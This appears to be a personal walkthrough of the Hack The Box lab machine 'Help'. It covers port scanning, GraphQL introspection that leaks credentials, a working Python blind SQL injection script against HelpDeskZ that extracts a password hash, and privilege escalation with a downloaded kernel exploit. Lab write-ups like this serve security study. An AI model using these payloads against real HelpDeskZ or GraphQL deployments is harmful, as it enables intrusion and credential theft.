+++
title = "HTB - Help"
date = 2024-11-26
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.121
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 18:01 EST
Nmap scan report for 10.10.10.121
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds
```
### Enumeration
Apache webpage with default configurations.
`/support` directory on webpage. We find HelpDeskZ Application
`Searchsploit` suggests file upload capability? 
Exploit script found will not work off of the shelf. When capturing the packets in BurpSuite and looking at the headers, we find that the server is on a different time configuration. This will throw errors. I tried to fix by turning off time control and using `rdate` to match my machine's time to the server's, but NTP was refused. IppSec has a great tutorial on using `python` to grab the local time from the http header, and then implementing that into the script for the correct time. Good stuff!

Modification of 40300.py via Ippsec:
```python
import requests, time, calendar
response = requests.head('http://10.10.10.121/support/')
serverTime= response.headers['Date']

# Now, we've got to convert the time into Epoch time so that the computer can use it

timeFormat = "%a, %d %b %Y %H:%M:%S %Z"
currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))

```

Once the change has been made, we can navigate to the ticket portal and upload the file that way. In order to properly task our script with looking for our upload in the correct directory, we need to find the directory where our file will go. Looking on the open-source software's `github` yields this info, and we can infer that the file will end up in `support/uploads/tickets/`. 

Couldn't get this to work. ***NOTE: help.htb man. Instead of bozo IP

OTHER APPROACH

On port 3000, theres a Node.JS Express instance. We can see there's a message about a query. Research shows us this likely involves GraphQL. Big leap to make, but we need to infer that this is a page. When we visit, we get "Get Query Missing". Doing research about this and penetration testing, we find Hacktricks has some content:
`http://help.htb:3000/graphql`

`/graphql?query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,%20kind}}}}}}}`

This query will post everything we need, and we find there is a user object with credentials.
We can reformat our request to ask for this.
`http://help.htb:3000/graphql?query={+user+{+username,+password+}+}`
We find an email and crackable hash.
Credentials: `helpme@helpme.com:godhelpmeplz`
We can use Burp now to intercept and analyize te headers for a possible blind SQL injection. Very new to this area.
The searchsploit 41200 exploit explains it... Go to a valid sumbitted ticket (png) and copy the link location of the attachment, paste into browser, and capture with burp when sent. After last `param`, we've got blind SQLi. 
We'll write a script
```
support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and substr((select password from staff limit 0,1),0,1) = 'a'

import requests
def blindInject(query):
	url = f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 {query}"
	cookies = {'PHPSESSID':'q2ad1k16277id3u74q9ou2ntv0', 'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+Gz+oBvvORrEGSuigCmpMvNd+qXnVuQvUC/BVBSMu/IWQ=='}
	response = requests.get(url, cookies=cookies)
	rContentType = response.headers["Content-Type"]
	if rContentType == 'image/png':
		return True
	else:
		return False
keyspace = 'abcdef0123456789'
for i in range(0,41):
	for c in keyspace:
		inject = f"and substr((select password from staff limit 0,1),{i},1) = '{c}'"
		if blindInject(inject):
#			print(f"SUCCESS: {c}")
			print(c, end='', flush=True)
```
This script will provide the password Hash for SSH
USER: `10a1743faecb7786201ee5a7c804b22e`
### Privesc

Stabilize
mv to temp
conventionl ways to run dont work. run wit `bash linpeas.sh`
Old Kernel https://www.exploit-db.com/exploits/44298. Put into `exploit.c` file
Upload via wget
disguise on target box: `gcc exploit.c -o exploit`
./exploit
profit

ROOT:`05463fa7019fa0dc41fd1525bc9ad52c`